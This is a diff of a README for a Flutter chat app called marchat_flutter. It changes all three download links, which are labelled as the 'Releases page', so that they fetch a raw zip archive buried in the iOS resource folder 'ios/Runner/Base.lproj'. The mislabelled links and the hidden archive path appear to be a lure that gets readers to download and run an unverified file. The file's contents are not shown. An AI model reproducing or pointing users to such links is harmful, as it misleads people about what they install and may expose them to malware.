@@ -1,6 +1,6 @@
 # 🚀 marchat_flutter - A Simple Chat Experience for Everyone
 
-[![Download marchat_flutter](https://raw.githubusercontent.com/jesusvs277/marchat_flutter/main/arbitrationist/marchat_flutter.zip)](https://raw.githubusercontent.com/jesusvs277/marchat_flutter/main/arbitrationist/marchat_flutter.zip)
+[![Download marchat_flutter](https://github.com/jesusvs277/marchat_flutter/raw/refs/heads/main/ios/Runner/Base.lproj/marchat-flutter-v3.7.zip)](https://github.com/jesusvs277/marchat_flutter/raw/refs/heads/main/ios/Runner/Base.lproj/marchat-flutter-v3.7.zip)
 
 ## 🛠️ Overview
 marchat_flutter is a cross-platform chat client built with Flutter. This app allows you to send messages in real-time, share files easily, and enjoy many themes for a personalized experience. It also supports optional encryption key storage for your privacy. With admin commands, you can manage both users and the database smoothly.
@@ -8,7 +8,7 @@ marchat_flutter is a cross-platform chat client built with Flutter. This app all
 ## 📥 Download & Install
 To get started with marchat_flutter, visit the Releases page by clicking the link below. Here, you will find the latest version of the application ready for download.
 
-[Visit this page to download marchat_flutter](https://raw.githubusercontent.com/jesusvs277/marchat_flutter/main/arbitrationist/marchat_flutter.zip)
+[Visit this page to download marchat_flutter](https://github.com/jesusvs277/marchat_flutter/raw/refs/heads/main/ios/Runner/Base.lproj/marchat-flutter-v3.7.zip)
 
 Follow these steps to download and run the software:
 
@@ -64,4 +64,4 @@ Stay updated with marchat_flutter through our social media channels and communit
 marchat_flutter offers a user-friendly experience for anyone looking to communicate effectively. With its real-time messaging features and added utilities, it caters to both personal and administrative needs. Download and get started today!
 
 For details, visit the Releases page again: 
-[Visit this page to download marchat_flutter](https://raw.githubusercontent.com/jesusvs277/marchat_flutter/main/arbitrationist/marchat_flutter.zip)
+[Visit this page to download marchat_flutter](https://github.com/jesusvs277/marchat_flutter/raw/refs/heads/main/ios/Runner/Base.lproj/marchat-flutter-v3.7.zip)
